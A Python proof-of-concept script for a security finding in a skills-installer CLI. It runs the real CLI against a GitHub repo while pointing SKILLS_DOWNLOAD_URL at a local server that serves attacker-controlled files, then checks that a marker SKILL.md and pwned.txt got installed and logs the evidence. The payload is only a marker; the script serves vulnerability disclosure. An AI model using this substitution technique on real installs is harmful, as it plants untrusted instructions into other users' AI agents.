#!/usr/bin/env python3
"""
PoC for p10-006: blob fast-path installs snapshot files from SKILLS_DOWNLOAD_URL
without verifying them against the GitHub tree/raw content it used for discovery.

The script runs the real skills CLI against the allowlisted GitHub repository
vercel-labs/agent-skills, but points the snapshot download API at a local server
that serves attacker-controlled file contents. Exploitation is confirmed when the
CLI installs the attacker's marker under .agents/skills/web-design-guidelines/.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

MARKER = "P10_006_SNAPSHOT_SUBSTITUTION_MARKER"
OWNER_REPO = "vercel-labs/agent-skills"
SKILL = "web-design-guidelines"
AGENT = "codex"


def find_repo_root() -> Path:
    here = Path(__file__).resolve()
    for parent in [here.parent, *here.parents]:
        if (parent / "package.json").exists() and (parent / "bin" / "cli.mjs").exists():
            return parent
    raise RuntimeError("could not locate repository root containing package.json and bin/cli.mjs")


def safe_path_without_gh(original_path: str) -> str:
    """Prevent the CLI from picking up a stale local `gh auth token`."""
    kept: list[str] = []
    for part in original_path.split(os.pathsep):
        if not part:
            continue
        try:
            if (Path(part) / "gh").exists():
                continue
        except OSError:
            pass
        kept.append(part)
    return os.pathsep.join(kept) or "/nonexistent"


class SnapshotHandler(BaseHTTPRequestHandler):
    requests: list[str] = []

    def do_GET(self) -> None:  # noqa: N802 - BaseHTTPRequestHandler API
        SnapshotHandler.requests.append(self.path)
        body = json.dumps(
            {
                "hash": f"attacker-controlled-{MARKER}",
                "files": [
                    {
                        "path": "SKILL.md",
                        "contents": (
                            "---\n"
                            f"name: {SKILL}\n"
                            "description: attacker-controlled snapshot installed by p10-006 PoC\n"
                            "---\n\n"
                            f"# {MARKER}\n"
                            "This file was served by the snapshot API, not by the GitHub tree.\n"
                        ),
                    },
                    {"path": "pwned.txt", "contents": f"{MARKER} auxiliary attacker file\n"},
                ],
            }
        ).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *_args: object) -> None:
        return


def write_text(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def main() -> dict[str, str]:
    repo = find_repo_root()
    finding_dir = Path(__file__).resolve().parent
    evidence_dir = finding_dir / "evidence"
    evidence_dir.mkdir(parents=True, exist_ok=True)

    node = shutil.which("node")
    if not node:
        write_text(evidence_dir / "setup.log", "node not found in PATH\n")
        return {"status": "inconclusive", "evidence": "node runtime unavailable", "notes": "install Node.js to execute the CLI PoC"}

    cli = repo / "bin" / "cli.mjs"
    if not cli.exists():
        return {"status": "inconclusive", "evidence": "CLI entrypoint missing", "notes": str(cli)}

    write_text(
        evidence_dir / "setup.sh",
        "#!/bin/sh\n"
        "set -eu\n"
        "FINDING_DIR=$(CDPATH= cd -- \"$(dirname -- \"$0\")/..\" && pwd)\n"
        "REPO_ROOT=$(CDPATH= cd -- \"$FINDING_DIR/../../..\" && pwd)\n"
        "node --version\n"
        "python3 --version\n"
        "test -f \"$REPO_ROOT/bin/cli.mjs\"\n"
        "echo \"PoC prerequisites available in $REPO_ROOT\"\n",
    )
    write_text(
        evidence_dir / "exploit.sh",
        "#!/bin/sh\n"
        "set -eu\n"
        "FINDING_DIR=$(CDPATH= cd -- \"$(dirname -- \"$0\")/..\" && pwd)\n"
        "cd \"$FINDING_DIR\"\n"
        "exec python3 ./poc.py\n",
    )
    try:
        os.chmod(evidence_dir / "setup.sh", 0o755)
        os.chmod(evidence_dir / "exploit.sh", 0o755)
    except OSError:
        pass

    workdir = Path(tempfile.mkdtemp(prefix="p10-006-skills-poc-"))
    server = ThreadingHTTPServer(("127.0.0.1", 0), SnapshotHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    snapshot_url = f"http://127.0.0.1:{server.server_port}"

    env = os.environ.copy()
    env.pop("GITHUB_TOKEN", None)
    env.pop("GH_TOKEN", None)
    env.update(
        {
            "SKILLS_DOWNLOAD_URL": snapshot_url,
            "DISABLE_TELEMETRY": "1",
            "DO_NOT_TRACK": "1",
            "CI": "1",
            "NO_COLOR": "1",
            "FORCE_COLOR": "0",
            "PATH": safe_path_without_gh(env.get("PATH", "")),
        }
    )

    write_text(
        evidence_dir / "env-info.txt",
        "repo_root=" + str(repo) + "\n"
        "workdir=" + str(workdir) + "\n"
        "node=" + node + "\n"
        "cli=" + str(cli) + "\n"
        "source=" + OWNER_REPO + "\n"
        "skill=" + SKILL + "\n"
        "agent=" + AGENT + "\n"
        "snapshot_url=" + snapshot_url + "\n",
    )
    write_text(
        evidence_dir / "setup.log",
        f"Started local malicious snapshot API at {snapshot_url}\n"
        f"Using temporary project directory {workdir}\n",
    )
    write_text(
        evidence_dir / "healthcheck.log",
        f"repo exists: {repo.exists()}\n"
        f"cli exists: {cli.exists()}\n"
        f"node: {node}\n"
        "GitHub/raw health is exercised by the CLI during exploit execution.\n",
    )

    cmd = [
        node,
        str(cli),
        "add",
        OWNER_REPO,
        "--skill",
        SKILL,
        "--agent",
        AGENT,
        "--copy",
        "-y",
    ]

    try:
        proc = subprocess.run(
            cmd,
            cwd=str(workdir),
            env=env,
            text=True,
            capture_output=True,
            timeout=75,
        )
    except subprocess.TimeoutExpired as exc:
        server.shutdown()
        write_text(evidence_dir / "exploit.log", f"command timed out: {' '.join(cmd)}\n{exc}\n")
        return {"status": "inconclusive", "evidence": "CLI execution timed out", "notes": "GitHub/network access may be blocked"}
    finally:
        try:
            server.shutdown()
        except Exception:
            pass

    installed = workdir / ".agents" / "skills" / SKILL / "SKILL.md"
    aux = workdir / ".agents" / "skills" / SKILL / "pwned.txt"
    installed_text = installed.read_text(encoding="utf-8", errors="replace") if installed.exists() else ""

    write_text(
        evidence_dir / "exploit.log",
        "$ " + " ".join(cmd) + "\n"
        f"cwd={workdir}\n"
        f"SKILLS_DOWNLOAD_URL={snapshot_url}\n"
        f"exit={proc.returncode}\n\n"
        "--- stdout ---\n" + proc.stdout + "\n"
        "--- stderr ---\n" + proc.stderr + "\n"
        "--- snapshot requests ---\n" + "\n".join(SnapshotHandler.requests) + "\n",
    )
    write_text(
        evidence_dir / "impact.log",
        f"installed_path={installed}\n"
        f"installed_exists={installed.exists()}\n"
        f"auxiliary_file_exists={aux.exists()}\n"
        f"marker_present={MARKER in installed_text}\n"
        f"snapshot_request_for_skill={any('/' + SKILL in r for r in SnapshotHandler.requests)}\n"
        "--- installed SKILL.md excerpt ---\n"
        + installed_text[:1000]
        + "\n",
    )

    if proc.returncode == 0 and MARKER in installed_text and any("/" + SKILL in r for r in SnapshotHandler.requests):
        return {
            "status": "confirmed",
            "evidence": f"installed {SKILL}/SKILL.md contains attacker marker {MARKER}",
            "notes": "real CLI used GitHub discovery but wrote snapshot API contents",
        }

    if proc.returncode != 0:
        return {
            "status": "inconclusive",
            "evidence": "CLI did not complete successfully",
            "notes": "see evidence/exploit.log; GitHub/network/dependency setup may be unavailable",
        }

    if not any("/" + SKILL in r for r in SnapshotHandler.requests):
        return {
            "status": "inconclusive",
            "evidence": "blob snapshot fast path was not exercised",
            "notes": "CLI likely fell back to git clone; check GitHub API/rate-limit access in evidence/exploit.log",
        }

    return {
        "status": "failed",
        "evidence": "snapshot API was used but installed skill did not contain attacker marker",
        "notes": "see evidence/impact.log",
    }


if __name__ == "__main__":
    print(f"Running p10-006 PoC: {OWNER_REPO} -> local attacker-controlled snapshot API")
    try:
        result = main()
    except Exception as exc:  # keep the structured output contract even on unexpected failures
        result = {"status": "inconclusive", "evidence": "PoC harness exception", "notes": repr(exc)}
    print(json.dumps(result, sort_keys=True))
